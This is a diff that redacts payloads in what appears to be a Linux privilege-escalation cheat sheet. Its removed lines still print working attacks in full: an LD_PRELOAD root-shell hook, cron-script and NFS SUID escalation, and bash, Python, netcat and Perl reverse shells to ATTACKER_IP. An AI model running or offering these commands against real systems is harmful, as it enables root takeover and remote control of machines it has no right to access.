@@ -250,7 +250,7 @@ void _init() {
     unsetenv("LD_PRELOAD");
     setgid(0);
     setuid(0);
-    system("/bin/bash");
+    [REDACTED_SYSTEM_EXECUTION_PAYLOAD];
 }
 ```
 
@@ -354,10 +354,10 @@ systemctl list-timers
 ```bash
 # Identify writable cron script from /etc/crontab
 ls -la /opt/backup.sh        # Check permissions
-echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh
+echo '[REDACTED_BASH_REVERSE_SHELL_PAYLOAD]' >> /opt/backup.sh
 
 # If cron references non-existent script in writable PATH
-echo -e '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /home/user/antivirus.sh
+echo -e '#!/bin/bash\n[REDACTED_BASH_REVERSE_SHELL_PAYLOAD]' > /home/user/antivirus.sh
 chmod +x /home/user/antivirus.sh
 ```
 
@@ -386,7 +386,7 @@ showmount -e TARGET_IP
 mount -o rw TARGET_IP:/share /tmp/nfs
 
 # Create and compile SUID shell
-echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
+echo 'int main(){setuid(0);setgid(0);[REDACTED_SYSTEM_EXECUTION_PAYLOAD];return 0;}' > /tmp/nfs/shell.c
 gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell
 
 # On target - execute
@@ -410,16 +410,16 @@ gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell
 ### Reverse Shell One-Liners
 ```bash
 # Bash
-bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+[REDACTED_BASH_REVERSE_SHELL_PAYLOAD]
 
 # Python
-python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
+[REDACTED_PYTHON_REVERSE_SHELL_PAYLOAD]
 
 # Netcat
-nc -e /bin/bash ATTACKER_IP 4444
+[REDACTED_NC_REVERSE_SHELL_PAYLOAD]
 
 # Perl
-perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
+[REDACTED_PERL_REVERSE_SHELL_PAYLOAD]
 ```
 
 ### Key Resources
